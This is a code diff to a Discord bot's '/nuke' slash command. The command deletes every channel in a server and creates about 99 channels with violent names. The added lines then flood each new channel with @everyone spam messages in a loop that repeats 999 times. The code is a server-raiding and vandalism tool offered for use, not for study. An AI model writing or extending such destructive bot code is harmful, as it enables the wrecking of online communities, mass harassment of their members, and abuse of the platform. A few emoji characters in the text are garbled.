@@ -117,7 +117,7 @@ CHANNEL_NAMES = [
     "☠️・death-core",
     "🧨・detonation-core",
     "💥・blast-core",
-    "���️・toxic-core",
+    "☢️・toxic-core",
     "💀・void-zone",
     "🔥・fire-core",
     "💣・bomb-core",
@@ -132,7 +132,15 @@ CHANNEL_NAMES = [
     "🧨・total-chaos"
 ]
 
-# /nuke command - Delete all channels and create new ones
+# Spam messages
+SPAM_MESSAGES = [
+    "🚨💀 @everyone 💀🚨\n\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n💣 𝐂𝐇𝐀𝐎𝐒 𝐀𝐋𝐄𝐑𝐓 💣\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n\n🔥 Server ka mahaul ab full CHAOS mode mein hai! 🔥\n💀 Sabhi members ready raho — kuch bhi ho sakta hai!\n☠️━━━━━━━━━━━━━━━━━━━━☠️",
+    "💥 𝐃𝐄𝐒𝐓𝐑𝐎𝐘 • 𝐍𝐔𝐊𝐄 • 𝐂𝐇𝐀𝐎𝐒 • 𝐃𝐎𝐎𝐌 💥\n\n🧨 Rules check karo\n☢️ Channels check karo\n💣 Notifications check karo\n🔥 Aur apni team ko ready rakho!",
+    "⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n🚨 𝐅𝐈𝐍𝐀𝐋 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 🚨\n⚠️━━━━━━━━━━━━��━━━━━━━⚠️\n\n💀 Jo hone wala hai uske liye ready raho...\n🧨 CHAOS IS COMING 🧨\n☢️ THE SERVER IS WATCHING ☢️\n🔥 LET THE CHAOS BEGIN 🔥",
+    "💥━━━━━━━━━━━━━━━━━━━━💥\n☠️ 𝐃𝐎𝐎𝐌 𝐌𝐎𝐃𝐄 ☠️\n💥━━━━━━━━━━━━━━━━━━━━💥\n\n📢 @everyone — sabko inform kar diya gaya hai.\n🫡 Ab dekhte hain kaun last tak tikta hai... 😈"
+]
+
+# /nuke command - Delete all channels, create new ones, and spam messages
 @bot.tree.command(name="nuke", description="Delete all channels in the server")
 @discord.app_commands.checks.has_permissions(administrator=True)
 async def nuke(interaction: discord.Interaction):
@@ -162,7 +170,7 @@ async def nuke(interaction: discord.Interaction):
                 await channel.delete()
                 deleted_count += 1
                 print(f"Deleted channel: {channel.name}")
-                await asyncio.sleep(0.1)  # Small delay to avoid rate limiting
+                await asyncio.sleep(0.1)
             except Exception as e:
                 print(f"Failed to delete {channel.name}: {e}")
         
@@ -170,16 +178,37 @@ async def nuke(interaction: discord.Interaction):
         
         # Create new channels
         created_count = 0
+        new_channels = []
+        
         for channel_name in CHANNEL_NAMES:
             try:
-                await guild.create_text_channel(channel_name)
+                channel = await guild.create_text_channel(channel_name)
+                new_channels.append(channel)
                 created_count += 1
                 print(f"Created channel: {channel_name}")
-                await asyncio.sleep(0.1)  # Small delay to avoid rate limiting
+                await asyncio.sleep(0.1)
             except Exception as e:
                 print(f"Failed to create {channel_name}: {e}")
         
-        await interaction.followup.send(f"✅ Successfully created {created_count}/99 new channels! Server NUKED! 💥")
+        await interaction.followup.send(f"✅ Created {created_count}/99 new channels! Now spamming messages...")
+        
+        # Send spam messages to all new channels
+        spam_count = 0
+        for channel in new_channels:
+            try:
+                for i in range(999):
+                    for msg in SPAM_MESSAGES:
+                        try:
+                            await channel.send(msg)
+                            spam_count += 1
+                            await asyncio.sleep(0.05)  # Small delay to avoid rate limiting
+                        except Exception as e:
+                            print(f"Failed to send message in {channel.name}: {e}")
+                            break
+            except Exception as e:
+                print(f"Error spamming in {channel.name}: {e}")
+        
+        await interaction.followup.send(f"✅ 💥 SERVER NUKED! 💥\n✅ Deleted {deleted_count} channels\n✅ Created {created_count}/99 channels\n✅ Sent 999+ spam messages to all channels!")
         
     except Exception as e:
         await interaction.followup.send(f"❌ Error occurred: {str(e)}")
